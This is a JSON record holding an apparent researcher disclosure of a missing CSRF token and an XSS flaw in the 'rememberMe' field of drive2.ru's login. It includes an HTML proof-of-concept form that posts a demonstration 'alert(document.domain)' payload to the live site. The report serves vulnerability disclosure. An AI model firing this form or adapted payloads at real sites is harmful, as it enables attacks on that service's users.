      "id": 21196,
      "category": "researcher",
      "content": "Many developers do not implement CSRF tokens on their login page. This doesn't have a big impact on security, but the CSRF token is implemented in Drive2, but the CSRF token is missing and XSS linkage was possible during login. XSS is performed through the `rememberMe` variable during login.\n\n##PoC\n```javascript\n<html>\n  <body>\n    <form action=\"https://www.drive2.ru/reception/?.AMRU=https%3A%2F%2Fwww.drive2.ru%2F\" method=\"POST\">\n      <input type=\"hidden\" name=\"login\" value=\"youremail\" />\n      <input type=\"hidden\" name=\"password\" value=\"yourpassword\" />\n      <input type=\"hidden\" name=\"rememberMe\" value=\"<img src=x onerror=alert(document.domain)>\"/>\n      <input type=\"hidden\" name=\"g&#45;recaptcha&#45;response\" value=\"03AHaCkAaaWRVYvbxavoJwreHHcF7LYNyq7A2sokgDWogNTXpwfoJqOvg&#45;0NWV3rpXGmRJIbJsDz&#45;7WBbxcTnXQcHFUlJXEjZlV1MlzKhR90lnCK0f6H0hapfn8ntpkb4yrxGL1rO8pEYIesSxN9n&#95;KzKcLiehwQntUANUgt4fNDWXPodZI8uiaAxlUFvHX7TqctiVxAweCXIuOKxqcFZcU7MQYV06ZeCWLaisH7vxL36gR64Uq0Uq57vacU4Wr6wWbHt&#95;eGuCzrFaXhQHeW43bBCqRhCwQj&#95;ht1BFvf9MoX9&#95;BDG7q7bdkag2x6P80nLqA46feChNVBFMJQ&#95;3M3cAtcm5kdfzOELRkmJ6nHoCe3VPW7yYc5jHSexYxj8G9DwMA1Qy4tpTWc4F\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n  </body>\n</html>\n```\n\n",
